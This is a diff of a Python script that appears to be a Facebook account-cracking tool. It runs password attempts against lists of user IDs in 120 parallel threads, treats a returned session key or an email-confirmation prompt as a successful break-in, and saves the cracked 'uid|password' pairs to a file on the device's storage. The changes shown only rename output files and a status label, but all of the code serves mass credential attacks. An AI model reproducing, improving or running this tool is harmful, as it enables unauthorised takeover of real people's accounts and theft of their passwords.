@@ -65,7 +65,7 @@ def file_iclone():
 def auto_pass(fileeee):
     tl=str(len(fileeee))
     print("  [•] TOTAL ID IN FILE: "+tl)
-    print("  [•] ID SAVED: /sdcard/GOXDIES.txt")
+    print("  [•] ALIVE SAVED: /sdcard/GOXDIES.txt")
     print(cox)
     with ThreadPool (max_workers=120) as feel:
         for data in fileeee:
@@ -198,12 +198,12 @@ def file_subb(uid,pwx):
             q=json.loads(p)
             if "session_key" in q:
                 print(f"\r\r  [✓] {uid} : {ps}      ")
-                open("/sdcard/GOXDIES-Ok.txt","a+").write(uid+"|"+ps+"\n")
+                open("/sdcard/GOXDIES.txt","a+").write(uid+"|"+ps+"\n")
                 oks.append(uid)
                 break
             elif "PLEASE, CONFIRM EMAIL: " in q:
                 print(f"\r\r। [✓] {uid} : {ps}      ")
-                open("/sdcard/GOXDIES-Ok.txt","a+").write(uid+"|"+ps+"\n")
+                open("/sdcard/GOXDIES.txt","a+").write(uid+"|"+ps+"\n")
                 oks.append(uid)
             elif "www.facebook.com" in q:
                 print(f"\r\r  [X] {uid} : {ps}      ")
